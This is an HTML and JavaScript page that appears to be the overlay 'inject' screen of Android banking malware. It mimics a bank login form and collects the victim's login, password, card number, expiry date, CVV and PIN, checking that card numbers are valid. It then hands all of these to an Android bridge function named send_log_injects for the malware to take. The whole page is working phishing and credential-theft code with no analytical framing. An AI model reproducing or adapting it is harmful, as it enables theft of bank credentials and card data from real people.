    <style>
        body {
            color: #fff;
            background-color: #242424;
            padding: 15px;
        }

        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .input {
            width: 100%;
            padding: 14px;
            font-size: 18px;
            color: #fff;
            background-color: #656565;
            border: 1px solid #656565;
            border-radius: 4px;
            margin-bottom: 5px;
        }

        .login {
            border-radius: 4px 4px 0 0;
        }

        .password {
            border-radius: 0 0 4px 4px;
        }

        ::placeholder {
            color: #cecece;
            opacity: 1;
            font-weight: 300;
            font-size: 14px;
        }
        :-moz-placeholder {
            color: #cecece;
            opacity: 1;
            font-weight: 300;
            font-size: 14px;
        }
        :-ms-input-placeholder {
            color: #cecece;
            opacity: 1;
            font-weight: 300;
            font-size: 14px;
        }
        ::-moz-placeholder {
            color: #cecece;
            opacity: 1;
            font-weight: 300;
            font-size: 14px;
        }
        ::-webkit-input-placeholder {
            color: #cecece;
            opacity: 1;
            font-weight: 300;
            font-size: 14px;
        }

        .button {
            width: 100%;
            padding: 15px;
            border: 0;
            background-color: #49a251;
            color: #fff;
            font-size: 18px;
            border-radius: 4px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>

            </header>
            <section>   
                <input type="tel" class="input" id="cc" name="cc" onkeyup="check6();check5();" placeholder="Credit Card" autocomplete="off">
                <input type="tel" class="input" id="exp" name="exp" onkeyup="check7();check5();" style="width: 40%;float: left;" placeholder="Expiration Date" autocomplete="off">
                <input type="password" inputmode="numeric" class="input" id="cvv" name="cvv" onkeyup="check5();" style="width: 29%;float: left;margin-left: 1%;" placeholder="CVV" autocomplete="off">
                <input type="password" inputmode="numeric" class="input" id="pin" name="pin" onkeyup="check5();" style="width: 29%;float: right;" placeholder="PIN" autocomplete="off">
            </section>
            <footer>
                <input type="submit" class="button" disabled id="sendData" value="LOGIN">
            </footer>
        </div>
    </form>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        $('#pin').mask('0000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),
            pin = document.getElementById('pin');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        nextPage.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 4) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 4 && password.value.length >= 4) {
                spinner.style.display = 'block'

                setTimeout(() => {
                    form1.style.display = 'none'
                    spinner.style.display = 'none'
                    form2.style.display = 'flex'
                }, 1500);
            }
        } 

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check7() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.pin = pin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
</body>
</html>
